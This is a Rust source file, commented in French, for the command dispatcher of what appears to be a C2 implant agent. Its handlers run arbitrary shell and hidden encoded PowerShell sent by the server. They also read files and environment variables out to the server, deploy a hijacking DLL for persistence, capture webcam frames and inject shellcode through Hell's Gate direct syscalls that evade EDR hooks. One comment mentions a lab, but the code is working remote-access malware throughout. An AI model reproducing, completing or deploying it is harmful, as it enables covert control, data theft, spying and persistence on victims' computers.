// commands.rs — Exécution des tâches reçues du serveur C2
//
// Chaque TaskType du modèle a un handler correspondant ici.
// Les handlers retournent toujours un TaskResult avec output/error.

use crate::transport::{Task, TaskResult};
use std::process::Command;

/// Dispatcher — route chaque tâche vers le bon handler
pub fn execute(task: &Task, agent_id: &str) -> TaskResult {
    let payload = task.payload.as_deref().unwrap_or("");

    let (output, error, success) = match task.task_type.as_str() {
        "shell"      => run_shell(payload),
        "powershell" => run_powershell(payload),
        "proclist"   => list_processes(),
        "download"   => download_file(payload),
        "sleep"      => change_sleep(payload),
        "netstat"    => get_netstat(),
        "envdump"    => dump_env(),
        "cd"         => change_directory(payload),
        "pwd"        => print_directory(),
        "hijack"     => hijack_cmd(payload),
        "inject"     => inject_cmd(payload),
        "webcam_snap"    => webcam_snap(),
        _            => (
            String::new(),
            format!("Unknown task type: {}", task.task_type),
            false,
        ),

    };

    TaskResult {
        task_id:  task.id.clone(),
        agent_id: agent_id.to_string(),
        output,
        error,
        success,
    }
}

// ─────────────────────────────────────────────────────────────
// Payload Structures
// ─────────────────────────────────────────────────────────────
use serde::Deserialize;

#[derive(Deserialize)]
struct InjectPayload {
    pub method: String,
    pub pid: Option<u32>,
    pub shellcode: String, // base64 encoded
}

#[derive(Deserialize)]
struct HijackPayload {
    pub action: String,
    pub dll_base64: Option<String>,
}

// ─────────────────────────────────────────────────────────────
// Handlers
// ─────────────────────────────────────────────────────────────

/// run_shell — exécute une commande shell Windows
///
/// Utilise cmd.exe /c pour une compatibilité maximale.
/// stdout et stderr sont capturés et retournés au serveur.
fn run_shell(cmd: &str) -> (String, String, bool) {
    if cmd.is_empty() {
        return (String::new(), "empty command".into(), false);
    }

    #[cfg(target_os = "windows")]
    let result = Command::new("cmd.exe")
        .args(["/c", cmd])
        .output();

    #[cfg(not(target_os = "windows"))]
    let result = Command::new("sh")
        .args(["-c", cmd])
        .output();

    match result {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let success = output.status.success();
            (stdout, stderr, success)
        }
        Err(e) => (String::new(), e.to_string(), false),
    }
}

/// run_powershell — exécute du PowerShell
///
/// Flags importants :
///   -NoP  : No Profile (chargement plus rapide)
///   -NonI : Non-Interactive
///   -W Hidden : Fenêtre cachée
///   -Enc  : Commande encodée en base64 (évite les problèmes de caractères)
fn run_powershell(script: &str) -> (String, String, bool) {
    if script.is_empty() {
        return (String::new(), "empty script".into(), false);
    }

    #[cfg(target_os = "windows")]
    let result = {
        // Encoder le script en UTF-16LE + base64 (format attendu par -EncodedCommand)
        let utf16: Vec<u8> = script
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            &utf16,
        );
        Command::new("powershell.exe")
            .args([
                "-NoP",
                "-NonI",
                "-W", "Hidden",
                "-EncodedCommand", &encoded,
            ])
            .output()
    };

    #[cfg(not(target_os = "windows"))]
    let result = Command::new("pwsh")
        .args(["-NonInteractive", "-Command", script])
        .output();

    match result {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            (stdout, stderr, output.status.success())
        }
        Err(e) => (String::new(), e.to_string(), false),
    }
}

/// list_processes — liste les processus en cours
fn list_processes() -> (String, String, bool) {
    #[cfg(target_os = "windows")]
    let (out, err, ok) = run_shell("tasklist /fo csv /nh");

    #[cfg(not(target_os = "windows"))]
    let (out, err, ok) = run_shell("ps aux --no-headers");

    (out, err, ok)
}

/// download_file — lit un fichier et retourne son contenu en base64
fn download_file(path: &str) -> (String, String, bool) {
    match std::fs::read(path) {
        Ok(data) => {
            let encoded = base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                &data,
            );
            (encoded, String::new(), true)
        }
        Err(e) => (String::new(), e.to_string(), false),
    }
}

/// change_sleep — modifie l'intervalle beacon
fn change_sleep(payload: &str) -> (String, String, bool) {
    match payload.parse::<u64>() {
        Ok(secs) => (
            format!("Sleep interval updated to {}s", secs),
            String::new(),
            true,
        ),
        Err(e) => (String::new(), e.to_string(), false),
    }
}

/// get_netstat — connexions réseau actives
fn get_netstat() -> (String, String, bool) {
    #[cfg(target_os = "windows")]
    return run_shell("netstat -ano");

    #[cfg(not(target_os = "windows"))]
    return run_shell("netstat -tulnp 2>/dev/null || ss -tulnp");
}

/// dump_env — variables d'environnement
fn dump_env() -> (String, String, bool) {
    let env: Vec<String> = std::env::vars()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect();
    (env.join("\n"), String::new(), true)
}

// Import base64 pour run_powershell
use base64;

/// change_directory — change le dossier courant de l'agent
fn change_directory(path: &str) -> (String, String, bool) {
    if path.is_empty() {
        return (String::new(), "usage: cd <directory>".into(), false);
    }
    match std::env::set_current_dir(path) {
        Ok(_) => {
            // Retourner le nouveau chemin absolu si possible
            match std::env::current_dir() {
                Ok(new_path) => (format!("{}", new_path.display()), String::new(), true),
                Err(_) => ("Directory changed".into(), String::new(), true),
            }
        }
        Err(e) => (String::new(), e.to_string(), false),
    }
}

/// print_directory — affiche le dossier courant
fn print_directory() -> (String, String, bool) {
    match std::env::current_dir() {
        Ok(path) => (format!("{}", path.display()), String::new(), true),
        Err(e) => (String::new(), e.to_string(), false),
    }
}

/// hijack_cmd — handle hijack task with JSON payload
fn hijack_cmd(payload: &str) -> (String, String, bool) {
    let hijack_req: HijackPayload = match serde_json::from_str(payload) {
        Ok(req) => req,
        Err(e) => return (String::new(), format!("Invalid hijack payload: {}", e), false),
    };

    if hijack_req.action == "scan" {
        return hijack_scan();
    } else if hijack_req.action == "deploy" {
        if let Some(dll_base64) = hijack_req.dll_base64 {
            return hijack_deploy(&dll_base64);
        } else {
            return (String::new(), "Missing dll_base64 for deploy action".into(), false);
        }
    }

    (String::new(), format!("Unknown hijack action: {}", hijack_req.action), false)
}

/// hijack_scan — cherche des opportunités de DLL hijacking
fn hijack_scan() -> (String, String, bool) {
    let targets = crate::inject::dll_hijack::find_hijack_opportunities();
    if targets.is_empty() {
        return ("Aucune opportunité de DLL hijacking trouvée sur ce système.".into(), String::new(), true);
    }

    let mut output = String::from("Opportunités de DLL Hijacking trouvées :\n");
    for (i, t) in targets.iter().enumerate() {
        output.push_str(&format!(
            "[{}] Application : {:?}\n    DLL Manquante : {}\n    Drop Path : {:?}\n",
            i, t.app_path, t.dll_name, t.drop_path
        ));
    }
    
    (output, String::new(), true)
}

/// hijack_deploy — déploie une DLL proxy pour le hijacking
fn hijack_deploy(payload: &str) -> (String, String, bool) {
    if payload.is_empty() {
        return (String::new(), "usage: hijack_deploy <base64_dll_bytes>".into(), false);
    }

    // Décoder la DLL depuis le base64
    let dll_bytes = match base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        payload,
    ) {
        Ok(bytes) => bytes,
        Err(e) => return (String::new(), format!("Erreur décodage base64 : {}", e), false),
    };

    // Pour le lab, on va cibler calc.exe -> VERSION.dll par défaut si on trouve la cible
    let targets = crate::inject::dll_hijack::find_hijack_opportunities();
    
    // On cherche une cible valide (de préférence calc.exe pour le lab)
    let target = targets.into_iter().find(|t| t.dll_name.to_lowercase() == "version.dll")
        .or_else(|| {
             // Si pas de calc.exe, on prend la première cible dispo si elle existe
             crate::inject::dll_hijack::find_hijack_opportunities().into_iter().next()
        });

    if let Some(target) = target {
        match crate::inject::dll_hijack::persistence_via_hijack(&target, &dll_bytes) {
            Ok(msg) => (msg, String::new(), true),
            Err(e) => (String::new(), e, false),
        }
    } else {
        (String::new(), "Aucune cible de hijacking trouvée pour déployer la DLL.".into(), false)
    }
}

/// webcam_snap — tente de capturer un frame depuis la webcam de la cible
///
/// Utilise Windows Media Foundation (WMF) pour accéder à la webcam
/// et WIC (Windows Imaging Component) pour encoder le frame en JPEG.
///
/// En cas d'échec, retourne une explication détaillée des défenses
/// Windows qui ont bloqué l'accès (Privacy API, GPO, LED matérielle...).
fn webcam_snap() -> (String, String, bool) {
    let result = crate::recon::webcam::try_capture();
    let output = result.to_c2_output();

    if result.success {
        (output, String::new(), true)
    } else {
        (String::new(), output, false)
    }
}

// ─────────────────────────────────────────────────────────────
// Hell's Gate — Direct Syscalls (bypass hooks EDR)
// ─────────────────────────────────────────────────────────────

/// inject_cmd — handle inject task with JSON payload
fn inject_cmd(payload: &str) -> (String, String, bool) {
    let req: InjectPayload = match serde_json::from_str(payload) {
        Ok(r) => r,
        Err(e) => return (String::new(), format!("Invalid inject payload: {}", e), false),
    };

    let shellcode = match base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        req.shellcode,
    ) {
        Ok(bytes) => bytes,
        Err(e) => return (String::new(), format!("Base64 decode error: {}", e), false),
    };

    if req.method == "local" {
        return run_hellsgate_local(&shellcode);
    } else if req.method == "hellsgate" {
        if let Some(pid) = req.pid {
            return run_hellsgate_remote(&shellcode, pid);
        } else {
            return (String::new(), "Missing pid for hellsgate injection".into(), false);
        }
    }

    (String::new(), format!("Unknown inject method: {}", req.method), false)
}

fn run_hellsgate_remote(shellcode: &[u8], pid: u32) -> (String, String, bool) {
    unsafe {
        let table = match crate::inject::hellsgate::resolve_syscall_table() {
            Ok(t) => t,
            Err(e) => return (String::new(), format!("Hell's Gate init failed: {}", e), false),
        };

        match crate::inject::hellsgate::hellsgate_inject(&table, shellcode, pid) {
            Ok(p) => (
                format!(
                    "[Hell's Gate] Shellcode injecté avec succès dans PID {}\n\
                     Technique: Direct syscalls (bypass hooks ntdll)\n\
                     SSN NtAllocateVirtualMemory: 0x{:04X}\n\
                     SSN NtCreateThreadEx: 0x{:04X}",
                    p,
                    table.nt_allocate_virtual_memory.map(|e| e.ssn).unwrap_or(0),
                    table.nt_create_thread_ex.map(|e| e.ssn).unwrap_or(0),
                ),
                String::new(),
                true,
            ),
            Err(e) => (String::new(), format!("Hell's Gate inject failed: {}", e), false),
        }
    }
}

fn run_hellsgate_local(shellcode: &[u8]) -> (String, String, bool) {
    unsafe {
        let table = match crate::inject::hellsgate::resolve_syscall_table() {
            Ok(t) => t,
            Err(e) => return (String::new(), format!("Hell's Gate init failed: {}", e), false),
        };

        match crate::inject::hellsgate::hellsgate_inject_local(&table, shellcode) {
            Ok(()) => (
                format!(
                    "[Hell's Gate] Shellcode exécuté localement (self-inject)\n\
                     Technique: Direct syscalls\n\
                     SSN NtAllocateVirtualMemory: 0x{:04X}\n\
                     SSN NtProtectVirtualMemory: 0x{:04X}\n\
                     SSN NtCreateThreadEx: 0x{:04X}",
                    table.nt_allocate_virtual_memory.map(|e| e.ssn).unwrap_or(0),
                    table.nt_protect_virtual_memory.map(|e| e.ssn).unwrap_or(0),
                    table.nt_create_thread_ex.map(|e| e.ssn).unwrap_or(0),
                ),
                String::new(),
                true,
            ),
            Err(e) => (String::new(), format!("Hell's Gate local inject failed: {}", e), false),
        }
    }
}

